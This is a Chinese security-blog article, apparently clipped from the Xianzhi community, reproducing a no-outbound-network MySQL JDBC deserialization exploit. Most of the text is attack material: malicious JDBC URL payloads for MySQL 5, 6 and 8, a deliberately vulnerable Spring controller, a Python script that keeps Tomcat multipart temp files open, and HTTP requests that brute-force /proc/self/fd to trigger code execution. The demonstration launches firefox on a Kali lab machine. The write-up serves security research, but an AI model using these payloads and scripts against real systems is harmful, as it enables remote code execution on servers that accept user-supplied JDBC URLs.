---
title: 【先知】Mysql JDBC利用FD实现不出网利用
source: https://xz.aliyun.com/news/92715
source_host: xz.aliyun.com
clip_date: 2026-08-21T15:02:58+08:00
trace_id: 6b312370-1d83-40d2-91cf-d95ea22bde39
content_hash: 1318b970deef2f405240fff6c7dc6dd2a1c6a92d9d0be70cc9f53ae8a19ee191
status: synced
tags:
  - 先知
  - 漏洞分析
  - 协议分析
series: null
feed_source: 先知安全技术社区
ai_summary: Mysql JDBC利用NamedPipeSocketFactory可读本地文件，配合Tomcat multipart临时文件与/proc/self/fd枚举，实现不出网命令执行。
ai_summary_style: key-points
images_status:
  total: 8
  succeeded: 8
  failed_urls: []
notion_page_id: 3c375244-d011-81d6-bb75-f722e8892b29
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Mysql JDBC利用NamedPipeSocketFactory可读本地文件，配合Tomcat multipart临时文件与/proc/self/fd枚举，实现不出网命令执行。
> 
> - **利用原理：** MySQL JDBC可通过`socketFactory=com.mysql.cj.protocol.NamedPipeSocketFactory`并指定`namedPipePath`读取本地文件，配合`autoDeserialize=true`与ServerStatusDiffInterceptor触发反序列化，本地链为EventListenList调用toString触发Jackson反序列化，再用Spring动态代理稳定调用TemplatesImpl。
> - **Payload示例：** mysql8版本利用参数为`useSSL=false&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&socketFactory=com.mysql.cj.protocol.NamedPipeSocketFactory&namedPipePath=&maxAllowedPacket=74996390`。
> - **临时文件生成：** 利用Tomcat multipart上传时故意不发送结尾`--boundary--`且保持keep-alive，临时文件会留在`/tmp/tomcat.xxx/work/Tomcat/localhost/ROOT`下，进程同时获得相应文件描述符fd。
> - **FD枚举利用：** 上传恶意文件后，将`namedPipePath`设为`/proc/self/fd/{1-100}`逐一爆破，命中fd即可触发利用；演示中在fd=29时成功打开firefox，完成不出网利用。
> - **实战效果：** 利用过程无需目标出网，只需上传一次临时文件并枚举fd值，效率较高。

本篇文章主要复现下MYSQL JDBC如何在不出网的情况实现与利用，大家也知道目前Mysql JDBC不出网可以使用NamedPipeSocketFactory读取本地文件实现利用，具体原理这里不做赘述，大家想了解可以参考其他文章。具体Payload如下：

```plain
//mysql5
jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.jdbc.NamedPipeSocketFactory&namedPipePath=
```

```plain
//mysql6
jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath=
```

```plain
//mysql8
jdbc:mysql://xxx/test?&maxAllowedPacket=74996390&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.cj.protocol.NamedPipeSocketFactory&namedPipePath=
```

通过Java-chain可以直接生成Payload，如下图

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/5b0b08e410c208b3.png)

那么可以想到既然namedPipePath指定本地文件的话，在Linux下是否可以通过上传临时文件，然后直接枚举读取/proc/self/fd实现不出网利用。

### 环境部署

这里我们创建一个Springboot应用，写一个测试JDBC的Controller，如下

```plain
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import java.sql.Connection;
import java.sql.DriverManager;
import java.util.LinkedHashMap;
import java.util.Map;

@RestController
public class JdbcTestController {

    @PostMapping("/testconnect")
    public Map<String, Object> testConnect(@RequestBody Map<String, String> body) {
        Map<String, Object> result = new LinkedHashMap<>();
        String jdbcUrl = body.get("url");

        if (jdbcUrl == null || jdbcUrl.trim().isEmpty()) {
            result.put("success", false);
            result.put("error", "url parameter is required");
            return result;
        }

        boolean hasUser = body.containsKey("user") && body.get("user") != null;
        boolean hasPassword = body.containsKey("password") && body.get("password") != null;

        long start = System.currentTimeMillis();
        try {
            Connection conn;
            if (hasUser || hasPassword) {
                String username = body.getOrDefault("user", "");
                String password = body.getOrDefault("password", "");
                conn = DriverManager.getConnection(jdbcUrl, username, password);
            } else {
                conn = DriverManager.getConnection(jdbcUrl);
            }
            try {
                result.put("success", true);
                result.put("url", jdbcUrl);
                result.put("database", conn.getCatalog());
                result.put("driver", conn.getMetaData().getDriverName() + " " + conn.getMetaData().getDriverVersion());
            } finally {
                conn.close();
            }
        } catch (Exception e) {
            result.put("success", false);
            result.put("url", jdbcUrl);
            result.put("error", e.toString());
        }
        result.put("elapsedMs", System.currentTimeMillis() - start);
        return result;
    }
}
```

依赖只传入mysql-connector-java即可，版本这里我们测试选择mysql8。

```plain
<dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>8.0.19</version>
        </dependency>
```

### 本地文件利用

环境部署好之后，我们这里通过本地文件测试看一下，首先通过Java-chain生成恶意Pipe文件，由于我们测试环境未导入其他依赖，所以得依赖本地原生利用链，这里采用的是EventListenList调用toString触发Jackson反序列化，然后利用Spring动态代理解决jackson调用TemplatesImpl的不稳定问题，具体调用链如下，这里我测试的目标服务器是Kali，所以我们通过执行firefox打开浏览器来验证执行效果。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/f95a717516ea0bfc.png)

然后我们来发包测试看一下，发现成功打开firefox。

```plain
POST /testconnect HTTP/1.1
Content-Type: application/json
Host: XXXXXXXX

{"url": "jdbc:mysql://127.0.0.1:3306/test?useSSL=false&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&socketFactory=com.mysql.cj.protocol.NamedPipeSocketFactory&namedPipePath=&maxAllowedPacket=74996390&user=mysql&dbname=test"}
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/3f37378e62055dea.png)

### FD临时文件利用

接下来我们来看如何利用临时文件进行上传。首先我们知道Tomcat可通过 multipart 上传临时文件到服务器，并且会在会在 javax.servlet.context.tempdir 指向的工作目录（形如 work/Tomcat/xxx/ROOT/）下创建一个磁盘临时文件（文件名形如 upload_xxxxxxxx.tmp)。

这里我们来测试一下，写一个上传临时文件的脚本，如下,通过故意不发送结尾 --boundary--, 且 Connection: keep-alive, 让服务端 multipart 一直等，这样可以一直保持临时文件存在。

```plain
#!/usr/bin/env python3
import socket, sys, time, ssl
from urllib.parse import urlparse

def main():
    if len(sys.argv) < 3:
        print("用法: python3 upload_hold.py <URL> <要上传的文件> [padding字节数]")
        print("示例: python3 upload_hold.py http://127.0.0.1:9999/upload /tmp/x.jar 60000")
        sys.exit(1)

    raw = sys.argv[1]
    file_path = sys.argv[2]
    PAD = int(sys.argv[3]) if len(sys.argv) > 3 else 60000

    u = urlparse(raw if "://" in raw else "http://" + raw)
    scheme = (u.scheme or "http").lower()
    host = u.hostname
    port = u.port or (443 if scheme == "https" else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    default_port = (scheme == "http" and port == 80) or (scheme == "https" and port == 443)
    host_hdr = host if default_port else f"{host}:{port}"

    def conn():
        s = socket.create_connection((host, port), timeout=30)
        if scheme == "https":
            s = ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
        return s

    data = open(file_path, "rb").read()
    bnd = "----XuanBoundary"
    A_head = (f"--{bnd}\r\n"
        'Content-Disposition: form-data; name="file"; filename="x.bin"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n").encode()
    A_tail = f"\r\n--{bnd}--\r\n".encode()
    A_body = A_head + data + b"\x00" * PAD
    A_clen = len(A_head) + len(data) + PAD + len(A_tail)

    A_req = (f"POST {path} HTTP/1.1\r\nHost: {host_hdr}\r\n"
        f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
        f"Content-Length: {A_clen}\r\n"
        f"Connection: keep-alive\r\n\r\n").encode()

    sA = conn()
    sA.sendall(A_req + A_body)
    print(f"[*] 已上传 {len(data)} 字节 + padding({PAD}), 文件路径: {file_path}")
    print(f"[*] 目标: {scheme}://{host_hdr}{path}")
    print("[*] 连接保持中... (可按 Ctrl+C 或等待超时后由本脚本关闭)")
    try:
        time.sleep(60)
    except KeyboardInterrupt:
        pass
    finally:
        try:
            sA.close()
        except Exception:
            pass
        print("[*] 连接已关闭, 临时文件 fd 释放")

if __name__ == "__main__":
    main()
```

然后上传firefox文件，可以在 **/tmp/tomcat.9999.8683199716576915357/work/Tomcat/localhost/ROOT** 找到我们上传的临时文件。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/dab26678a052bb78.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/00b896053f3556e8.png)

然后在Mysql JDBC利用时设置 **namedPipePath** 为这个路径也可以实现利用，但这个临时文件位置随机，无法直接获取。这时候我们就可以想到在上传临时文件时，除了上述 **/tmp/tomcat.9999.8683199716576915357/work/Tomcat/localhost/ROOT** 之类的目录会生成临时文件，同时进程因此获得一个文件描述符 fd N，然后利用 **/proc/self/fd/N** 指向该文件。

这里我们再上传临时文件，写一个监控脚本看 **/proc/self/fd/N** 中是否指定了该文件。可以看到/proc/427906/fd/26指向了这个临时文件，所以我们在Mysql JDBC利用过程中其实可以指定namedPipePath=/proc/self/fd/26进行不出网利用，往往只需爆破一下fd值即可，效率其实挺高的。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/163de619247ef3b1.png)

这样我们思路其实就很清晰了。在我们上传临时文件的同时，同时枚举namedPipePath=/proc/self/fd/XX，就可以实现namedPipePath加载恶意文件实现不出网利用。这里我们来演示一下。

首先上传临时文件，如下

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/bdbc97f3a0d64be5.png)

然后发送数据包，对 **namedPipePath=/proc/self/fd/{{int(1-100)}}** 进行枚举，当命中fd时即可实现利用。如下，在fd=29时成功命中打开了firefox，由此实现不出网利用。

```plain
POST /testconnect HTTP/1.1
Content-Type: application/json
Host: 

{"url": "jdbc:mysql://127.0.0.1:3306/test?useSSL=false&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&socketFactory=com.mysql.cj.protocol.NamedPipeSocketFactory&namedPipePath=/proc/self/fd/{{int(1-100)}}&maxAllowedPacket=74996390&user=mysql&dbname=test"}
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/d9885e81da2ed574.png)
